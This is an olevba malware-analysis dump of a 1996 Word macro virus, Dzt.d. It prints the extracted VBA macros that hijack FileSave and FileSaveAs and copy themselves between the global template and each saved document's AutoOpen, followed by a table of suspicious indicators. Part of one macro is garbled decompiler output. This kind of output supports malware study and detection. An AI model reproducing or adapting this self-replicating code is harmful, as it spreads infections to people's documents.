olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dzt.d-c54e7f03d49508f92857fd468422e017422ccea8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dzt.d-c54e7f03d49508f92857fd468422e017422ccea8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Dzt.d-c54e7f03d49508f92857fd468422e017422ccea8 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim Filebaru$, FileMacro$
Dim salah

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Filebaru$ = ""
FileMacro$ = ""
salah = 0
WordBasic.DisableInput (1)
WordBasic.Unrecognized_Statement63798       Let                To     -1  String -1  >= -1   +1   +1  -1+1  'EndIf +1   : Redim   : Redim : Redim   Alias : Redim   Resume : Redim   : : Redim   Let : Redim    : Dim       Case _
  , Unrecognized_Argument49282  -    Step               : Redim                    Single        Select    Is       *    Then    Name      Select      Select      Select      Select      Select      Select      Select      Select      Select      Select      Select      Select      Select      Name      Name      Select      Name      Name      Name      Name      Select      Select      Select      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name      Name                 <=    Open                   )
salah = Err.Number
End Sub

Private Sub CopyAOtoG()
On Error GoTo -1: On Error GoTo finish
WordBasic.MacroCopy FileMacro$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyAOF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSave", Filebaru$ + ":AutoOpen", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT'96" + Chr(13) + "(c)9 April 1996 by Hikmat S/D0E94328" + Chr(13) + "comp. dept. of HFT" + Chr(13) + "Instrumentasi Elektronika" + Chr(13) + "MIPA Terapan Fakultas MIPA" + Chr(13) + "Universitas Padjadjaran" + Chr(13) + "Bandung"
finish:
End Sub

-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Dzt.d-c54e7f03d49508f92857fd468422e017422ccea8 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim formatfile, salah
Dim Filebaru$

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim Ukuran$
Dim Rev$
Dim Ls$
formatfile = 0
salah = 0
Filebaru$ = ""
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
On Error GoTo -1: On Error GoTo finish
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics dlg
Ukuran$ = UCase(dlg.FileSize)
Rev$ = dlg.Revision
Ls$ = dlg.LastSaved
If (Ukuran$ = "0 BYTES") Or (Rev$ = "1") Or (Ls$ = "") Then SaveTo
If (Ukuran$ <> "0 BYTES") Or (Rev$ <> "1") Or (Ls$ <> "") Then SaveFile -1
finish:
If Err.Number = 509 Then SaveTo
End Sub

Private Sub SaveTo()
Dim fileFormat
On Error GoTo -1: On Error GoTo finish
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
formatfile = dlg.Format
Filebaru$ = dlg.Name
WordBasic.FileSaveAs dlg
finish:
If ((Err.Number = 0) And (fileFormat < 2)) Then SaveFile (0)
End Sub

Private Sub SaveFile(cek)
On Error GoTo -1: On Error GoTo finish
If cek Then
    Filebaru$ = WordBasic.[FileName$]()
    CekFormat
End If
If formatfile = 1 Then CopyToFile
If formatfile = 0 Then
    WordBasic.FileSaveAs Name:=Filebaru$, Format:=1
    CopyToFile
End If
finish:
If salah = 0 Then
    Aksi
    WordBasic.FileSave
End If
End Sub

Private Sub CekFormat()
On Error GoTo -1: On Error GoTo finish
Dim dlog As Object: Set dlog = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlog
formatfile = dlog.Format
finish:
If Err.Number <> 0 Then formatfile = Err.Number
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyFSAF
End If
If salah <> 0 Then
    CopyFSG
    CopyFSAG
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSave", Filebaru$ + ":AutoOpen", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyFSG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyFSAG()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy Filebaru$ + ":FileSaveAs", "Global:FileSaveAs", 1
finish:
End Sub

Private Sub CopyFSAF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSaveAs", Filebaru$ + ":FileSaveAs", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT'96" + Chr(13) + "(c)9 April 1996 by Hikmat S/D0E94328" + Chr(13) + "comp. dept. of HFT" + Chr(13) + "Instrumentasi Elektronika" + Chr(13) + "MIPA Terapan Fakultas MIPA" + Chr(13) + "Universitas Padjadjaran" + Chr(13) + "Bandung"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Dzt.d-c54e7f03d49508f92857fd468422e017422ccea8 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

